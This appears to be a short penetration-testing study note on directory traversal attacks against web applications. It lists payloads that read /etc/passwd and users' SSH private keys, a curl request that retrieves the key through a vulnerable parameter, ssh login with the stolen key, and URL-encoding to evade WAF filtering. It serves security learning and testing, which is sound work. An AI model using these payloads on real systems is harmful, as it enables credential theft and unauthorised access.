
Allows us to read the contents of a file outside of the web root.

Directory traversal attacks can occur when a web application is not sanitizing user input.
Using directory traversal attacks we may be able to reveal sensitive information such as passwords or keys which may lead to system access.

We can test for directory traversal in get parameters. We can search the source code and buttons/links for addresses that may be vulnerable to directory traversal.

### Exploitation

#### Linux

1. `../../../../../../../etc/passwd`  - we can use as many relative paths as we want in order to reach the root directory - here we can find the users on the system
2. `../../../../home/<user>/.ssh/id_rsa` - here using a user we found in the /etc/passwd file we search for an ssh key to gain access to the system
3. `curl http://<URL>/<dir>/index.php?page=../../../../home/user/.ssh/id_rsa` - retrieve the key using curl/burp/programming language to get correct formatting.
4. `chmod 400 id_rsa` - adjust permissions of key to use for authentication
5. `ssh -i id_rsa -p 2222 user@ip/address`

Sometimes we will need to encode our `../` due to filtering from either the web application, a WAF/firewall or webserver. `%2e%2e/%2e%2e/`
#### Windows

Windows is not as easy as Linux. To exploit windows via directory traversal we must scour the system for sensitive log files and config files for services running on the system as there is no direct equivalent to Linux ssh access. 

When traversing windows we need to try both `../` and `..\..\` as some windows servers will only understand `..\`.
